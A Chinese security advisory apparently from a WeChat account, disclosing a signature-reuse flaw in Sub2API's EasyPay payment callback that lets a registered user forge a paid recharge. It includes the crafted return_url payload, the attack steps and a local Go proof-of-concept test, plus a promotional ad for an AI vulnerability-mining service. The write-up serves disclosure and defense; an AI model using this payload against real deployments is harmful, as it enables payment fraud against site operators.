---
title: Sub2api 存在支付回调计费漏洞 (中转站长注意)
url: https://mp.weixin.qq.com/s/_OwOY4GAxTtR8x3zL5tPeA
source: Doonsec's feed
date: 2026-10-06
fetch_date: 2026-10-07T07:50:36.117144
---

# Sub2api 存在支付回调计费漏洞 (中转站长注意)

# Sub2api 存在支付回调计费漏洞 (中转站长注意)

XingYue404
XingYue404

星悦安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&randomid=1jvfty28&tp=webp#imgIndex=0)

点击上方蓝字关注我们 并设为星标

## 0x00 前言

Sub2API 是一站式开源中转服务，让 Claude、Openai 、Gemini、Grok订阅统一接入，支持拼车共享，更高效分摊成本，原生工具无缝使用

![](https://mmbiz.qpic.cn/mmbiz_png/De3yb4u5JSr1UHxv1vwlWHwMMxmuWibibIndEMAEglQicrb4cm8iaBT5ic94F4H0t4585heSWUnvicE8iac4zsLetzgAUCNumIYgbib4icjlp2CItCSc/640?wx_fmt=png&from=appmsg)

## 0x01 漏洞分析

易支付（EasyPay）回调验签存在签名复用漏洞：**攻击者无需商户密钥（pkey），即可伪造支付成功回调给任意自己的订单入账**。

* 影响范围：所有启用易支付、且使用 popup（submit.php 跳转）模式的部署

* 攻击者前置条件：仅需要一个普通注册用户账号（能发起充值下单），无需任何密钥

* 后果：零成本给自己账户充值任意金额（有多少订单就能刷多少）

### 缺陷 A：签名基础串拼接不转义

`easyPaySign` 把参数按 key 排序后直接 `k=v&k=v...` 拼接再追加 pkey，**值中的 `&`/`=` 不做任何转义**：

```
_, _ = buf.WriteString(k + "=" + params[k])
```

这意味着**一个参数的值里可以"藏"另一个参数**：只要伪造回调解析出的参数集合，排序拼接后与下单签名串逐字节一致，签名验证即通过。

### 缺陷 B：return\_url 的 query 未净化 + popup 模式签名暴露

1. 下单接口接受用户提交的 `return_url`，`CanonicalizeReturnURL` 只校验 scheme/host/path（必须是本站 `/payment/result`），**query 原样保留**；
2. `buildPaymentReturnURL`

   往里追加 `order_id/out_trade_no/resume_token/status` 后按 key 排序重编码，用户注入的 `trade_status=TRADE_SUCCESS` 恰好排在 return\_url 值内部的**最末尾**；
3. popup（submit.php）模式下，**下单签名随支付 URL 直接暴露在付款人（即攻击者）浏览器里**。

## 0x02 攻击链 & 利用

1. 攻击者下单时提交：
   `return_url = https://你的站点/payment/result?trade_status=TRADE_SUCCESS`
2. 服务端追加参数并重编码后，下单签名实际覆盖这样一段串：

```
money=650.00&name=...&notify_url=...&out_trade_no=ORDER123&pid=1000\&return_url=https://site/payment/result?order_id=99&out_trade_no=ORDER123&status=success&trade_status=TRADE_SUCCESS\&type=alipay<PKEY>
```

3.攻击者从自己支付 URL 里拿到该签名，请求 /api/v1/payment/webhook/easypay，把 `return_url`**只编码到 `status=success` 为止**，让 `&trade_status=TRADE_SUCCESS` 以裸 `&` 形式升为顶层参数。

4.  回调验签重新排序拼接，`trade_status` 在串中的位置与下单签名串**逐字节相同** → 签名通过、`trade_status == "TRADE_SUCCESS"`、`money` 等于自己订单应付金额 → 判定支付成功并入账。

POC :（纯本地单测，不触网）

```
func TestForgedCallback(t *testing.T) {	e := &EasyPay{config: map[string]string{		"pid": "1000", "pkey": "MERCHANT_SECRET_KEY",		"apiBase":   "https://pay.example.com",		"notifyUrl": "https://site.example.com/api/v1/payment/webhook/easypay",	}}
	// 1. 下单（popup 模式）：return_url 末尾藏着 trade_status=TRADE_SUCCESS	returnURL := "https://site.example.com/payment/result?order_id=99&out_trade_no=ORDER123&status=success&trade_status=TRADE_SUCCESS"	createParams := map[string]string{		"pid": "1000", "type": "alipay", "out_trade_no": "ORDER123",		"notify_url": e.config["notifyUrl"], "return_url": returnURL,		"name": "balance recharge", "money": "650.00",	}	sign := easyPaySign(createParams, e.config["pkey"]) // 攻击者从自己支付 URL 里直接拿到
	// 2. 伪造回调：return_url 只编码前半段，trade_status 升为顶层参数	prefix := "https://site.example.com/payment/result?order_id=99&out_trade_no=ORDER123&status=success"	cb := url.Values{}	cb.Set("pid", "1000"); cb.Set("type", "alipay"); cb.Set("out_trade_no", "ORDER123")	cb.Set("notify_url", e.config["notifyUrl"]); cb.Set("name", "balance recharge")	cb.Set("money", "650.00"); cb.Set("return_url", prefix)	rawCallback := cb.Encode() + "&trade_status=TRADE_SUCCESS" + "&sign=" + sign + "&sign_type=MD5"
	n, err := e.VerifyNotification(context.Background(), rawCallback, nil)	// 修复前实测：err == nil, n.Status == "success", n.Amount == 650 —— 伪造入账成功}
```

修复前实测输出：`BUG REPRODUCED: forged callback accepted, order=ORDER123 amount=650`

## **0x03 AI 漏洞挖掘**

****标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所****

******星悦AI中转提供GPT-6-Astra 漏洞挖掘分析.******

https://www.xyusec.com/

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/De3yb4u5JSpw3mD5QGdJNu3ibSLzI5iazszbxVteNxBg2E6CptElX09kjgVwWfodEFs8gMjXsyerWLERjCWx7PqbvN4RFwxBhxMASYvDN8fWQ/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

新用户还可以添加进群领5$额度

![](https://mmbiz.qpic.cn/mmbiz_jpg/De3yb4u5JSqThVW2Ewno8tKUh6UMqNkvOzCDibvJQmyexRrArZMmcPo1C6RApIWebU1iaRJPuZicicCXo9UfrIIgCEhHmeGCrMAHricCqyKzRkrw/640?wx_fmt=jpeg)

******免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!******

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/uicic8KPZnD5dyHp8uiasNyNWQgSUlzVSibCfnv5HjhSB9o1zibZnicxGGalykSuiaux0iaMneticVbzcGFRxbLP5kaSg1A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过